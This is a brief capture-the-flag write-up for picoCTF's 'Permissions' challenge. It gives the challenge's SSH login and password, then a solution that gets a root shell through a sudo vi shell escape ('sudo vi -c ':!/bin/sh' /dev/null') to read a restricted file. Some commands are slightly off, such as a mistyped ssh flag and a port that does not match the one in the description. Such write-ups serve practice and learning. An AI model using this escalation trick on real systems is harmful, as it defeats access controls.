<h1>Permissions</h1>

<h2>Description</h2>
<blockquote>
<p></p>Can you read files in the root file?<br/>
  The system admin has provisioned an account for you on the main server:<br/>
  ssh -p 51608 picoplayer@saturn.picoctf.net<br/>
  Password: 33qE7mB5BF<br/>
  Can you login and read the root file?<p>
</blockquote>

<h2>Solution</h2>
<p>Run command: <code>ssh - p 55120 picoplayer@saturn.picoctf.net</code></p>
<p>Then enter password <code>33qE7mB5BF</code></p>
<p>Become to picoplayer@challenge</p>
<p><code>cd ../..</code></p>
<p><code>ls</code></p>
<p><code>cd challenge/</code> -> <code>cat metadata.json</code></p>
<p>If there is error <code>-bash: cd: challenge/: Permission denied</code> then do:</p>
<ul>
  <li><code>sudo -l</code></li>
  <li><code>sudo vi -c ':!/bin/sh' /dev/null</code></li>
  <li><code># ls</code></li>
  <li><code># cd challenge</code></li>
  <li><code># cat metadata.json</code></li>
</ul>
